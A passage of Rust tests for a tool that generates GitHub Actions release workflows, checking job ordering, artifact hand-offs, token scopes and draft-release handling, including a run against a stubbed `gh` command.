        assert_eq!(
            steps[installer]["uses"].as_str(),
            Some("goreleaser/goreleaser-action@f06c13b6b1a9625abc9e6e439d9c05a8f2190e94"),
            "the installer is pinned to a complete commit identity"
        );
        assert_eq!(
            steps[installer]["with"]["install-only"].as_bool(),
            Some(true),
            "the installer installs the command; the build step runs it"
        );
        assert_eq!(
            steps[installer]["with"]["version"].as_str(),
            Some("2.17.1"),
            "the packager whose output layout these recipes read is pinned too"
        );
        let build_step = steps
            .iter()
            .position(|step| {
                step["run"]
                    .as_str()
                    .is_some_and(|run| run.contains("goreleaser"))
            })
            .expect("the build job runs the packager");
        assert!(
            installer < build_step,
            "the packager is installed before it is run"
        );

        // A packager a runner already carries derives no installer, so this is
        // a per-packager statement rather than a step every build job gained.
        let workspace = two_destination_workspace("workflow-buildx-toolchain");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        assert!(
            !job_steps(&jobs, "intentional_build_component_buildx")
                .iter()
                .any(|step| step["uses"]
                    .as_str()
                    .is_some_and(|uses| uses.contains("goreleaser"))),
            "an unrelated packager derives no GoReleaser installer"
        );
    }

    // A tap, a package index, and the Arch User Repository accept no workflow
    // identity token. Granting the scope anyway widens the job for nothing.
    #[test]
    fn withholds_the_workflow_identity_scope_from_repository_destinations() {
        let workspace = go_workspace("workflow-go-permissions");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        for publisher in job_ids(&jobs, "intentional_publish_") {
            let permissions = jobs[&Value::String(publisher.clone())]["permissions"]
                .as_mapping()
                .expect("permissions")
                .clone();
            assert_eq!(
                permissions.get(Value::String("contents".to_owned())),
                Some(&Value::String("read".to_owned())),
                "{publisher}"
            );
            assert!(
                permissions
                    .get(Value::String("id-token".to_owned()))
                    .is_none(),
                "{publisher} needs no workflow identity token: {permissions:?}"
            );
        }

        // The scope survives where a registry actually accepts it, so this is a
        // recipe distinction rather than a blanket withdrawal.
        let workspace = two_destination_workspace("workflow-oci-permissions");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        for publisher in job_ids(&jobs, "intentional_publish_") {
            assert_eq!(
                jobs[&Value::String(publisher.clone())]["permissions"]["id-token"].as_str(),
                Some("write"),
                "{publisher}"
            );
        }
    }

    // One publisher-job template serves every recipe, so which publications
    // consume a draft asset is now a conditional inside it rather than a
    // separate template. Both sides of that conditional are load-bearing: a
    // draft-dependent publisher without a handoff is refused by `verify
    // publication`, and a publisher that reads no draft asset supplying one is
    // refused by the same command. Neither refusal is reachable from here, so
    // the derivation is what has to get the answer right.
    #[test]
    fn names_the_draft_handoff_only_for_a_publisher_that_reads_one() {
        for (label, workspace, draft_dependent) in [
            ("go", go_workspace("workflow-handoff-go"), true),
            ("npm", npm_workspace("workflow-handoff-npm"), false),
        ] {
            converge(workspace.root(), WorkflowRole::Publish);
            let jobs = publish_jobs(workspace.root());
            let publishers = job_ids(&jobs, "intentional_publish_");
            assert!(!publishers.is_empty(), "{label} derives a publisher job");
            for publisher in publishers {
                let handoff = job_steps(&jobs, &publisher)
                    .iter()
                    .find_map(|step| {
                        step["with"]["draft-handoff"]
                            .as_str()
                            .map(std::borrow::ToOwned::to_owned)
                    })
                    .unwrap_or_else(|| panic!("{publisher} verifies its publication"));
                assert_eq!(
                    !handoff.is_empty(),
                    draft_dependent,
                    "{publisher} names the handoff its consumer path reads: {handoff:?}"
                );
                if draft_dependent {
                    assert!(
                        handoff.contains(&publisher.replace("intentional_publish_", ""))
                            && handoff.ends_with(crate::publication::draft::DRAFT_HANDOFF_FILE),
                        "{publisher} reads the handoff for its own publication: {handoff:?}"
                    );
                }
            }
        }
    }

    // The deliverable RPM and APT distribute is the GitHub Release asset itself,
    // which the managed upload job places on the draft. Deriving a publisher job
    // before that job exists would ship a publication whose deliverable nothing
    // uploads, and the refusal has to say that rather than something the design
    // has since answered: a reader who is told the ownership is unsettled looks
    // for a decision that was already made.
    #[test]
    fn refuses_a_publication_whose_deliverable_nothing_uploads() {
        for publisher in ["rpm", "apt"] {
            let workspace = go_workspace("workflow-go-unsettled");
            workspace.write(
                ".intentional/config.yml",
                &GO_CONFIG.replace(
                    "    aur: {}\n",
                    &format!("    aur: {{}}\n    {publisher}: {{}}\n"),
                ),
            );
            let comparison = compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                .expect("comparison runs");
            assert_eq!(comparison.status, ComparisonStatus::Blocked);
            let diagnostic = comparison
                .diagnostics
                .iter()
                .find(|diagnostic| diagnostic.code == "deliverable-upload-underived")
                .unwrap_or_else(|| panic!("{publisher} is refused: {:?}", comparison.diagnostics));
            assert!(
                diagnostic
                    .message
                    .contains(&format!("component/{publisher}/primary")),
                "{}",
                diagnostic.message
            );
            assert!(
                diagnostic.message.contains("the managed upload job")
                    && diagnostic.message.contains("not derived yet"),
                "the refusal names the job that is missing rather than an open question: {}",
                diagnostic.message
            );
        }
    }

    /// Id the Dev Container Feature fixture names itself by.
    const FEATURE_ID: &str = "example-feature";

    /// A release unit that publishes one Dev Container Feature to GHCR.
    fn feature_workspace(label: &str) -> Workspace {
        let workspace = workspace(label);
        workspace
            .write(
                ".intentional/config.yml",
                &TWO_DESTINATION_CONFIG.replace(
                    "      dockerhub: { repository: example-owner/example-image }\n",
                    "",
                ),
            )
            .write(
                "component/devcontainer-feature.json",
                &format!(r#"{{"id":"{FEATURE_ID}","version":"1.2.3"}}"#),
            );
        workspace
    }

    fn two_destination_workspace(label: &str) -> Workspace {
        let workspace = workspace(label);
        workspace
            .write(".intentional/config.yml", TWO_DESTINATION_CONFIG)
            .write("component/Dockerfile", DOCKERFILE);
        workspace
    }

    /// A Dockerfile that names the image it builds, as the recipe requires.
    const DOCKERFILE: &str =
        "FROM scratch\nLABEL org.opencontainers.image.title=\"example-image\"\n";

    /// Managed jobs of the derived publish workflow, by identifier.
    fn publish_jobs(root: &Path) -> serde_yaml::Mapping {
        let document: Value =
            serde_yaml::from_str(&workflow(root, WorkflowRole::Publish)).expect("result parses");
        document["jobs"].as_mapping().expect("jobs").clone()
    }

    fn job_needs(jobs: &serde_yaml::Mapping, id: &str) -> Vec<String> {
        jobs[&Value::String(id.to_owned())]["needs"]
            .as_sequence()
            .expect("needs")
            .iter()
            .filter_map(Value::as_str)
            .map(str::to_owned)
            .collect()
    }

    fn job_ids(jobs: &serde_yaml::Mapping, prefix: &str) -> Vec<String> {
        jobs.keys()
            .filter_map(Value::as_str)
            .filter(|id| id.starts_with(prefix))
            .map(str::to_owned)
            .collect()
    }

    /// Every unrendered `@PLACEHOLDER@` a derived workflow still carries.
    ///
    /// A placeholder is an uppercase-and-underscore run between two `@`, which
    /// no substituted value produces: an Action pin, a token URL, and a shell
    /// variable all continue in characters this stops at.
    fn residual_placeholders(workflow: &str) -> Vec<String> {
        let bytes = workflow.as_bytes();
        let mut residual = Vec::new();
        for (start, _) in workflow.match_indices('@') {
            let mut end = start + 1;
            while end < bytes.len() && (bytes[end].is_ascii_uppercase() || bytes[end] == b'_') {
                end += 1;
            }
            if end > start + 1 && bytes.get(end) == Some(&b'@') {
                residual.push(workflow[start..=end].to_owned());
            }
        }
        residual
    }

    // Rendering substitutes derived values before namespaces, because a derived
    // value can itself name a namespace placeholder: a packager's build script
    // refers to the prefixed subject variable. Substituting in the other order
    // emits `${@ENVVAR@SUBJECT}` verbatim into a privileged job's shell, which
    // every graph, ordering, and identity assertion in this module happily
    // accepts because the document still parses and every job is still where it
    // belongs. The residue is the only observable, so the residue is what is
    // asserted -- for the whole class rather than for the one placeholder that
    // exposed it.
    #[test]
    fn leaves_no_unrendered_placeholder_in_any_derived_workflow() {
        for workspace in [
            workspace("workflow-placeholders"),
            two_destination_workspace("workflow-placeholders-oci"),
        ] {
            for role in WorkflowRole::ALL {
                converge(workspace.root(), role);
                let derived = workflow(workspace.root(), role);
                assert_eq!(
                    residual_placeholders(&derived),
                    Vec::<String>::new(),
                    "the {role} workflow renders every managed template placeholder"
                );
            }
        }
    }

    /// Every artifact a managed job uploads, as artifact name to producing job.
    fn managed_uploads(root: &Path) -> BTreeMap<String, String> {
        let mut uploads = BTreeMap::new();
        for (id, steps) in managed_steps(root, WorkflowRole::Publish) {
            for step in &steps {
                if step.get("uses").and_then(Value::as_str) != Some(UPLOAD_ARTIFACT_ACTION) {
                    continue;
                }
                let name = step["with"]["name"]
                    .as_str()
                    .unwrap_or_else(|| panic!("{id} names the artifact it uploads"))
                    .to_owned();
                assert!(
                    uploads.insert(name.clone(), id.clone()).is_none(),
                    "{name} is uploaded by more than one managed job"
                );
            }
        }
        uploads
    }

    /// Every artifact selector a managed job downloads, with its consuming job.
    ///
    /// A selector is either an exact artifact name or a trailing-star prefix,
    /// which are the only two forms the download Action is given here.
    fn managed_downloads(root: &Path) -> Vec<(String, String, bool)> {
        let mut downloads = Vec::new();
        for (id, steps) in managed_steps(root, WorkflowRole::Publish) {
            for step in &steps {
                if step.get("uses").and_then(Value::as_str) != Some(DOWNLOAD_ARTIFACT_ACTION) {
                    continue;
                }
                let with = &step["with"];
                match (with["name"].as_str(), with["pattern"].as_str()) {
                    (Some(name), None) => downloads.push((id.clone(), name.to_owned(), true)),
                    (None, Some(pattern)) => {
                        let prefix = pattern.strip_suffix('*').unwrap_or_else(|| {
                            panic!("{id} downloads by a trailing-star prefix; got {pattern}")
                        });
                        downloads.push((id.clone(), prefix.to_owned(), false));
                    }
                    _ => panic!("{id} selects a download by exactly one of name or pattern"),
                }
            }
        }
        downloads
    }

    /// Artifact names one selector resolves to among what the graph produces.
    fn resolved<'a>(
        uploads: &'a BTreeMap<String, String>,
        selector: &str,
        exact: bool,
    ) -> BTreeSet<&'a str> {
        uploads
            .keys()
            .map(String::as_str)
            .filter(|name| {
                if exact {
                    *name == selector
                } else {
                    name.starts_with(selector)
                }
            })
            .collect()
    }

    /// Every managed job one job depends on, directly or through another.
    fn transitive_needs(jobs: &serde_yaml::Mapping, id: &str) -> BTreeSet<String> {
        let mut reached = BTreeSet::new();
        let mut pending = vec![id.to_owned()];
        while let Some(current) = pending.pop() {
            // The graph is rooted at tag verification, which waits for nothing.
            let needs = jobs[&Value::String(current.clone())]["needs"]
                .as_sequence()
                .map(|needs| {
                    needs
                        .iter()
                        .filter_map(Value::as_str)
                        .map(str::to_owned)
                        .collect::<Vec<_>>()
                })
                .unwrap_or_default();
            for need in needs {
                if reached.insert(need.clone()) {
                    pending.push(need);
                }
            }
        }
        reached
    }

    // Artifact names are the data path the derived graph runs on, and they agree
    // only by spelling: `download-artifact` given a pattern that matches nothing
    // does not fail, it produces an empty directory. A before-publication tag
    // then seals an empty subject set without complaint, pushes, and the run
    // dies at assembly naming a subject identity -- three jobs downstream of a
    // mistyped artifact prefix. Every other property of this graph is asserted;
    // this asserts the one the jobs actually share.
    #[test]
    fn binds_every_artifact_a_managed_job_consumes_to_the_job_that_produces_it() {
        for workspace in [
            workspace("workflow-artifact-binding"),
            two_destination_workspace("workflow-artifact-binding-oci"),
        ] {
            converge(workspace.root(), WorkflowRole::Publish);
            let jobs = publish_jobs(workspace.root());
            let uploads = managed_uploads(workspace.root());
            let downloads = managed_downloads(workspace.root());
            assert!(
                !downloads.is_empty(),
                "the publish graph transports artifacts between managed jobs"
            );

            // No managed job consumes an artifact nothing produces, and none
            // consumes one from a job it does not wait for.
            for (consumer, selector, exact) in &downloads {
                let produced = resolved(&uploads, selector, *exact);
                assert!(
                    !produced.is_empty(),
                    "{consumer} downloads {selector}{} which no managed job uploads; produced artifacts are {:?}",
                    if *exact { "" } else { "*" },
                    uploads.keys().collect::<Vec<_>>()
                );
                let upstream = transitive_needs(&jobs, consumer);
                for name in &produced {
                    let producer = &uploads[*name];
                    assert!(
                        upstream.contains(producer),
                        "{consumer} downloads {name} from {producer} without depending on it"
                    );
                }
            }

            // Each build job publishes its subject twice: the bytes and the
            // document together for the publishers, the document alone for the
            // before-publication tag.
            let builds = job_ids(&jobs, "intentional_build_");
            let documents = builds
                .iter()
                .map(|build| {
                    let produced = uploads
                        .iter()
                        .filter(|(_, producer)| *producer == build)
                        .map(|(name, _)| name.clone())
                        .collect::<BTreeSet<_>>();
                    let slug = build
                        .strip_prefix("intentional_build_")
                        .expect("the build job carries its subject slug");
                    assert_eq!(
                        produced,
                        [
                            format!("intentional_subject-{slug}"),
                            format!("intentional_subjectdoc-{slug}"),
                        ]
                        .into_iter()
                        .collect::<BTreeSet<_>>(),
                        "{build} uploads the combined subject and the document alone"
                    );
                    format!("intentional_subjectdoc-{slug}")
                })
                .collect::<BTreeSet<_>>();

            // A publisher promotes the subject its own build job produced, by
            // exact name, so it can never receive another subject's bytes.
            let publishers = job_ids(&jobs, "intentional_publish_");
            let fragments = publishers
                .iter()
                .map(|publisher| {
                    let downloaded = downloads
                        .iter()
                        .filter(|(consumer, _, _)| consumer == publisher)
                        .collect::<Vec<_>>();
                    let [(_, selector, exact)] = downloaded.as_slice() else {
                        panic!("{publisher} downloads exactly its own subject: {downloaded:?}");
                    };
                    assert!(*exact, "{publisher} names the subject artifact exactly");
                    let build = job_needs(&jobs, publisher)
                        .into_iter()
                        .find(|need| need.starts_with("intentional_build_"))
                        .expect("a publisher depends on the job that built its subject");
                    let slug = build
                        .strip_prefix("intentional_build_")
                        .expect("the build job carries its subject slug");
                    assert_eq!(
                        *selector,
                        format!("intentional_subject-{slug}"),
                        "{publisher} promotes the subject {build} produced"
                    );
                    uploads
                        .iter()
                        .find(|(_, producer)| *producer == publisher)
                        .map(|(name, _)| name.clone())
                        .unwrap_or_else(|| panic!("{publisher} uploads its evidence fragment"))
                })
                .collect::<BTreeSet<_>>();

            // Each phase stages exactly what it seals: the before-publication
            // tag reads the built-subject documents, the after-publication tag
            // reads the accepted fragments.
            let staged = |job: &str| {
                let selected = downloads
                    .iter()
                    .filter(|(consumer, _, _)| consumer == job)
                    .collect::<Vec<_>>();
                let [(_, selector, exact)] = selected.as_slice() else {
                    panic!("{job} stages one artifact selection: {selected:?}");
                };
                resolved(&uploads, selector, *exact)
                    .into_iter()
                    .map(str::to_owned)
                    .collect::<BTreeSet<_>>()
            };
            assert_eq!(
                staged("intentional_tag_before_publication"),
                documents,
                "the before-publication tag stages every built-subject document and no bytes"
            );
            let after = staged("intentional_tag_after_publication");
            assert!(
                fragments.iter().all(|fragment| after.contains(fragment)),
                "the after-publication tag stages every publisher fragment: {after:?}"
            );
            assert_eq!(
                after, fragments,
                "the after-publication tag stages the publisher fragments and nothing else"
            );
            let phase_documents = uploads
                .keys()
                .filter(|name| name.starts_with("intentional_phase-"))
                .cloned()
                .collect::<BTreeSet<_>>();
            assert_eq!(
                phase_documents.len(),
                job_ids(&jobs, "intentional_tag_").len(),
                "each phase tag job seals one document: {phase_documents:?}"
            );

            // Assembly reads every fragment and every sealed phase document,
            // which is what makes a phase whose evidence never arrived a
            // failure rather than a silent agreement.
            let assembled = downloads
                .iter()
                .filter(|(consumer, _, _)| consumer == "intentional_assemble_evidence")
                .flat_map(|(_, selector, exact)| resolved(&uploads, selector, *exact))
                .map(str::to_owned)
                .collect::<BTreeSet<_>>();
            assert_eq!(
                assembled,
                fragments.union(&phase_documents).cloned().collect(),
                "assembly stages every fragment and every sealed phase document"
            );
        }
    }

    // A subject is the thing a release publishes, not the act of publishing it.
    // Two destinations of one packager describe one subject, so the graph has
    // to derive one producer and two consumers of its artifact. Asserting the
    // derived graph rather than the template text is what makes this survive a
    // change in how the jobs are spelled.
    #[test]
    fn builds_one_subject_once_and_promotes_it_to_every_destination() {
        let workspace = two_destination_workspace("workflow-build-once");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        let builds = job_ids(&jobs, "intentional_build_");
        assert_eq!(
            builds,
            vec!["intentional_build_component_buildx".to_owned()],
            "two destinations of one packager derive one build job: {builds:?}"
        );
        let publishers = job_ids(&jobs, "intentional_publish_");
        assert_eq!(
            publishers.len(),
            2,
            "both destinations still derive their own publisher job: {publishers:?}"
        );
        for publisher in &publishers {
            assert!(
                job_needs(&jobs, publisher).contains(&builds[0]),
                "{publisher} depends on the job that built its subject"
            );
            let downloads = jobs[&Value::String(publisher.clone())]["steps"]
                .as_sequence()
                .expect("steps")
                .iter()
                .filter_map(|step| step["with"]["name"].as_str())
                .filter(|name| name.starts_with("intentional_subject-"))
                .map(str::to_owned)
                .collect::<Vec<_>>();
            assert_eq!(
                downloads,
                vec!["intentional_subject-component_buildx".to_owned()],
                "{publisher} promotes the one built subject rather than rebuilding it"
            );
        }
    }

    // The phases exist to state what was true before and after publication, so
    // their position in the graph is the whole claim: a before-publication tag
    // sealed after a publisher job would seal what already shipped, and an
    // after-publication tag sealed before one would seal what had not.
    #[test]
    fn orders_each_phase_tag_between_the_work_it_seals_and_the_work_it_gates() {
        let workspace = two_destination_workspace("workflow-phase-order");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        let before = "intentional_tag_before_publication";
        let after = "intentional_tag_after_publication";
        for build in job_ids(&jobs, "intentional_build_") {
            assert!(
                job_needs(&jobs, before).contains(&build),
                "the before-publication tag seals after {build}"
            );
        }
        for publisher in job_ids(&jobs, "intentional_publish_") {
            assert!(
                job_needs(&jobs, &publisher).contains(&before.to_owned()),
                "{publisher} publishes only after the before-publication tag is sealed"
            );
            assert!(
                job_needs(&jobs, after).contains(&publisher),
                "the after-publication tag seals after {publisher}"
            );
        }
        let assembly = job_needs(&jobs, "intentional_assemble_evidence");
        for phase in [before, after] {
            assert!(
                assembly.contains(&phase.to_owned()),
                "assembly reads what {phase} sealed: {assembly:?}"
            );
        }
    }

    // A phase with no configured tag seals nothing, so deriving its job would
    // emit a privileged job whose command refuses the invocation.
    #[test]
    fn derives_no_tag_job_for_a_phase_the_configuration_does_not_declare() {
        let declared = workspace("workflow-one-phase");
        converge(declared.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(declared.root());
        assert!(
            jobs.contains_key(Value::String(
                "intentional_tag_after_publication".to_owned()
            )),
            "the declared phase derives its tag job"
        );

        let undeclared = workspace("workflow-no-before-phase");
        undeclared.write(
            ".intentional/config.yml",
            &CONFIG.replace(
                "      staged: { role: projection, template: '{id}/staged@{version}', require-phase: before-publication }\n",
                "",
            ),
        );
        converge(undeclared.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(undeclared.root());
        assert!(
            !jobs.contains_key(Value::String(
                "intentional_tag_before_publication".to_owned()
            )),
            "an undeclared phase derives no tag job"
        );
        assert!(
            !job_needs(&jobs, "intentional_assemble_evidence")
                .contains(&"intentional_tag_before_publication".to_owned()),
            "assembly does not wait on a job that does not exist"
        );
    }

    // Tag creation is local and pushing is repository-owned, so a phase tag
    // reaches the repository through a job that mints the installation token
    // rather than through an Intentional-owned Action.
    #[test]
    fn pushes_each_phase_tag_through_the_repository_owned_privileged_step() {
        let workspace = two_destination_workspace("workflow-phase-push");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        for phase in [
            "intentional_tag_before_publication",
            "intentional_tag_after_publication",
        ] {
            let body = &jobs[&Value::String(phase.to_owned())];
            assert_eq!(
                body["environment"].as_str(),
                Some("intentional-release"),
                "{phase} transitions authority inside the protected environment"
            );
            let steps = body["steps"].as_sequence().expect("steps");
            assert!(
                steps.iter().any(|step| step["uses"]
                    .as_str()
                    .is_some_and(|uses| uses.starts_with("actions/create-github-app-token@"))),
                "{phase} mints the installation token that is the sole push authority"
            );
            let seal = steps
                .iter()
                .position(|step| {
                    intentional_action(step).is_some_and(|(name, _)| name == "seal-phase-tags")
                })
                .unwrap_or_else(|| panic!("{phase} seals its tags through the published Action"));
            let push = steps
                .iter()
                .position(|step| {
                    step.get("run")
                        .and_then(Value::as_str)
                        .is_some_and(|body| body.contains("git push --atomic"))
                })
                .unwrap_or_else(|| panic!("{phase} pushes the tags it sealed"));
            assert!(
                seal < push,
                "{phase} seals its tags locally before any of them is pushed"
            );
        }
    }

    /// The shell of one derived managed job, in the order a runner executes it.
    fn job_script(root: &Path, role: WorkflowRole, id: &str) -> String {
        let document: Value = serde_yaml::from_str(&workflow(root, role)).expect("result parses");
        document["jobs"][id]["steps"]
            .as_sequence()
            .unwrap_or_else(|| panic!("the {id} job carries steps"))
            .iter()
            .filter_map(|step| step["run"].as_str())
            .collect::<Vec<_>>()
            .join("\n")
    }

    /// The shell of the derived closure job, in the order a runner executes it.
    fn closure_script(root: &Path) -> String {
        job_script(root, WorkflowRole::Publish, "intentional_close_release")
    }

    fn offset_within(script: &str, fragment: &str) -> usize {
        script
            .find(fragment)
            .unwrap_or_else(|| panic!("`{fragment}` is part of the closure job: {script}"))
    }

    // Closure is the only point where a release becomes public, so the checks
    // that make it safe have to run while it is still reversible: a draft
    // release can be discarded, a published one cannot. Order is asserted
    // rather than presence because a rewrite that keeps every command but
    // moves one past the upload reintroduces exactly the failure the check
    // exists to prevent. Any later form of these managed jobs -- including
    // collapsing them into a composite action -- has to carry the ordering
    // forward, and this test is what refuses the alternative.
    #[test]
    fn asserts_the_release_is_a_draft_for_the_released_tag_before_uploading_assets() {
        let workspace = workspace("workflow-closure-draft-order");
        converge(workspace.root(), WorkflowRole::Publish);
        let script = closure_script(workspace.root());

        let upload = offset_within(&script, "gh release upload");
        assert!(
            offset_within(&script, "--json isDraft") < upload,
            "the release is proven undrafted before any asset reaches it: {script}"
        );
        assert!(
            offset_within(&script, "--json tagName") < upload,
            "the release is proven to belong to the released tag before any asset \
             reaches it: {script}"
        );
    }

    // Undrafting is irreversible, so the uploaded bytes have to be proven equal
    // to the assembled bytes while the release is still private. Order is
    // asserted rather than presence because a comparison that happens after the
    // release is public can only report the corruption, not prevent it.
    #[test]
    fn compares_every_uploaded_asset_against_its_local_digest_before_undrafting() {
        let workspace = workspace("workflow-closure-digest-order");
        converge(workspace.root(), WorkflowRole::Publish);
        let script = closure_script(workspace.root());

        let undraft = offset_within(&script, "--draft=false");
        assert!(
            offset_within(&script, "gh release download") < undraft,
            "each uploaded asset is fetched back before the release is published: {script}"
        );
        assert!(
            offset_within(&script, "sha256sum --check") < undraft,
            "each uploaded asset is compared against its local digest before the \
             release is published: {script}"
        );
    }

    /// The shell of the derived authority transition, in runner order.
    fn authority_script(root: &Path) -> String {
        job_script(root, WorkflowRole::Release, "intentional_release")
    }

    /// The derived draft-creation step, with its declared environment resolved
    /// from the verified step outputs the job produced.
    ///
    /// Resolution is what binds the two halves: the step's `env:` block names
    /// the variables and the `run:` body reads them, and a body reading a name
    /// the block does not declare would run with an empty value on a runner.
    /// Executing the body under exactly the declared environment is what makes
    /// that disagreement fail here.
    fn draft_creation(root: &Path, tag: &str) -> (String, BTreeMap<String, String>) {
        let steps = managed_steps(root, WorkflowRole::Release)
            .into_iter()
            .find(|(id, _)| id == "intentional_release")
            .expect("the authority transition is derived")
            .1;
        let step = steps
            .iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("gh release create"))
            })
            .expect("the authority transition creates the draft Release");
        let outputs = BTreeMap::from([
            ("token", "stub-installation-token"),
            ("global-tag", tag),
            ("source-sha", "0000000000000000000000000000000000000000"),
            ("release-sha", "1111111111111111111111111111111111111111"),
        ]);
        // The workflow contexts a runner would expand. Anything the step names
        // that is neither a verified step output nor one of these is refused,
        // because an ambient value that happens to agree with the verified
        // identity today is exactly the substitution this job cannot take.
        let contexts = BTreeMap::from([("${{ github.repository }}", "example-owner/example-repo")]);
        let environment = step["env"]
            .as_mapping()
            .expect("the creation step names its inputs")
            .iter()
            .map(|(key, value)| {
                let key = key.as_str().expect("an environment name is a scalar").to_owned();
                let value = value.as_str().expect("an environment value is a scalar");
                let resolved = value
                    .strip_prefix("${{ steps.")
                    .and_then(|rest| rest.strip_suffix(" }}"))
                    .and_then(|rest| rest.rsplit_once(".outputs."))
                    .and_then(|(_, name)| outputs.get(name).copied())
                    .or_else(|| contexts.get(value).copied())
                    .unwrap_or_else(|| {
                        panic!("the creation step reads {key} from a verified step output, not {value}")
                    });
                (key, resolved.to_owned())
            })
            .collect();
        let script = step["run"]
            .as_str()
            .expect("the creation step runs a script")
            .to_owned();
        (script, environment)
    }

    /// Execute the derived draft-creation step against a stubbed `gh`.
    ///
    /// Returns whether the step succeeded and the command line of every `gh`
    /// invocation it made, so a test can assert what the step did rather than
    /// what its text contains.
    ///
    /// The stub and its invocation log live outside the converged fixture so
    /// test scaffolding never lands in the tree the derivation produced.
    fn run_draft_creation(root: &Path, gh: &str) -> (bool, String) {
        use std::os::unix::fs::PermissionsExt;

        let (script, environment) = draft_creation(root, "component@1.2.3");
        let scaffold = Workspace::new("draft-creation-scaffold");
        let stub = scaffold.root().join("gh");
        std::fs::write(&stub, gh).expect("the stub is written");
        std::fs::set_permissions(&stub, std::fs::Permissions::from_mode(0o755))
            .expect("the stub is executable");
        let log = scaffold.root().join("invocations");

        let mut command = std::process::Command::new("bash");
        command
            .args(["-c", &script])
            .env_clear()
            .env(
                "PATH",
                format!("{}:/usr/bin:/bin", scaffold.root().display()),
            )
            .env("GH_STUB_LOG", log.display().to_string());
        for (key, value) in &environment {
            command.env(key, value);
        }
        let output = command.output().expect("the creation step runs");
        let recorded = std::fs::read_to_string(&log).unwrap_or_default();
        (output.status.success(), recorded)
    }

    /// A `gh` stub that records its arguments and answers `release view` with
    /// `view`, a shell fragment standing in for one state of the Release.
    fn gh_stub(view: &str) -> String {
        format!(
            "#!/usr/bin/env bash\nprintf '%s\\n' \"$*\" >> \"${{GH_STUB_LOG}}\"\n\
             case \"$*\" in\n  *'release view'*)\n{view}\n    ;;\nesac\nexit 0\n"
        )
    }

    /// The Release does not exist, in the words `gh` uses to say so.
    const GH_RELEASE_ABSENT: &str = "    printf 'release not found\\n' >&2\n    exit 1";
    /// The Release state could not be resolved at all.
    const GH_RELEASE_UNRESOLVED: &str =
        "    printf 'HTTP 503: Service Unavailable\\n' >&2\n    exit 1";

    // A draft cannot be created for a tag the remote does not yet carry, so the
    // creation step is only correct downstream of the atomic push. Order is
    // asserted by relative offset rather than by presence because a step that
    // exists in the wrong place reads as harmless in review and fails on a
    // release runner, after the branch has already moved.
    #[test]
    fn creates_the_draft_release_only_after_the_tag_is_pushed() {
        let workspace = workspace("workflow-draft-creation-order");
        converge(workspace.root(), WorkflowRole::Release);
        let script = authority_script(workspace.root());

        assert!(
            offset_within(&script, "git push --atomic")
                < offset_within(&script, "gh release create"),
            "the global release tag is published before a draft is created for it: {script}"
        );
    }

    // The draft names the tag the handoff verification proved, taken from the
    // same verified step outputs the push consumes. `github.ref_name` and the
    // configured template are both ambient values that agree with the verified
    // identity right up until they do not, and a draft created for the wrong
    // tag is a Release the closure job cannot find.
    #[test]
    fn binds_the_verified_release_tag_to_the_draft_creation_step() {
        let workspace = workspace("workflow-draft-creation-identity");
        converge(workspace.root(), WorkflowRole::Release);
        let steps = managed_steps(workspace.root(), WorkflowRole::Release)
            .into_iter()
            .find(|(id, _)| id == "intentional_release")
            .expect("the authority transition is derived")
            .1;

        let (verifier, action) = steps
            .iter()
            .find_map(|step| {
                let (name, _) = intentional_action(step)?;
                (name == "verify-handoff")
                    .then(|| (step["id"].as_str().expect("the step is addressable"), name))
            })
            .expect("the authority transition verifies the handoff through the Action");
        let creation = steps
            .iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("gh release create"))
            })
            .expect("the authority transition creates the draft Release");

        let consumed = creation["env"]
            .as_mapping()
            .expect("the creation step names its inputs")
            .values()
            .filter_map(Value::as_str)
            .filter_map(|value| {
                value
                    .strip_prefix(&format!("${{{{ steps.{verifier}.outputs."))?
                    .strip_suffix(" }}")
                    .map(str::to_owned)
            })
            .collect::<BTreeSet<_>>();
        assert_eq!(
            consumed,
            ["global-tag".to_owned()]
                .into_iter()
                .collect::<BTreeSet<_>>(),
            "the creation step reads the released tag from the verifying step"
        );
        assert!(
            action_outputs(&action).contains("global-tag"),
            "{action} declares the verified tag identity the creation step reads"
        );
    }

    // `immutable-github-release` states that a failure before closure leaves a
    // resumable draft, so creation is create-if-absent and a rerun continues
    // against the draft it already made. The step is executed rather than read:
    // a conditional that looks right and creates a second Release anyway is the
    // failure this proves cannot happen.
    #[test]
    fn resumes_an_existing_draft_rather_than_creating_a_second_release() {
        let workspace = workspace("workflow-draft-creation-rerun");
        converge(workspace.root(), WorkflowRole::Release);

        let (created, invocations) =
            run_draft_creation(workspace.root(), &gh_stub(GH_RELEASE_ABSENT));
        assert!(created, "the first run creates the draft: {invocations}");
        assert!(
            invocations.contains("release create") && invocations.contains("--draft"),
            "the first run creates the Release as a draft: {invocations}"
        );

        let (resumed, invocations) =
            run_draft_creation(workspace.root(), &gh_stub("    printf 'true\\n'"));
        assert!(resumed, "a rerun against an existing draft succeeds");
        assert!(
            !invocations.contains("release create"),
            "a rerun against an existing draft creates nothing: {invocations}"
        );
    }

    // The step names the repository it writes to rather than inheriting one.
    // The push step immediately before it rewrote `origin` to embed the
    // installation token, so a `gh` that resolved the repository from the
    // remote would take the Release the whole publication protocol keys on from
    // a URL another step mutated. That is an unstated cross-step dependency in
    // the one step that creates the Release, which is why it is asserted.
    #[test]
    fn names_the_repository_the_draft_release_is_created_in() {
        let workspace = workspace("workflow-draft-creation-repository");
        converge(workspace.root(), WorkflowRole::Release);
        let steps = managed_steps(workspace.root(), WorkflowRole::Release)
            .into_iter()
            .find(|(id, _)| id == "intentional_release")
            .expect("the authority transition is derived")
            .1;
        let creation = steps
            .iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("gh release create"))
            })
            .expect("the authority transition creates the draft Release");

        assert_eq!(
